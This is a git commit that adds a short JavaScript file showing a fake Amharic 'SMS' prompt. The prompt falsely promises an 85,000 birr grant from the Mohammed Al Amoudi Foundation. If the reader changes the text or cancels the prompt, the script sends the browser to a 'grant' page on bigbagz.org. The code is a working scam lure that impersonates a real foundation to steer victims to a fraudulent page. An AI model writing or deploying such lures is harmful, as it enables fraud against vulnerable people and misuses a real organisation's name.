dc7fa697337e7d1bb5b1256bb507f45dd8ad2a5b
bigbagzz <usakpolo247@gmail.com>
2025-05-24 04:59:51 +0100

    Create ethio-active.js

---
+++ ethio-active.js
@@ -0,0 +1,5 @@
+var password = 'ETB85,000 ማውጣት'
+password=prompt('SMS: እንኳን ደስ ያለህ ከመሀመድ አል አሙዲ ፋውንዴሽን 85,000 የቢዝነስ ድጋፍ ስጦታ ለመቀበል ከተመረጡት መካከል ናችሁ ፣ አሁን ገንዘብ ለማውጣት እሺን ይጫኑ ','ETB85,000 ማውጣት');
+if (password != 'ETB85,000 ማውጣት') {
+location.href='https://bigbagz.org/ethio-grant.html';
+}
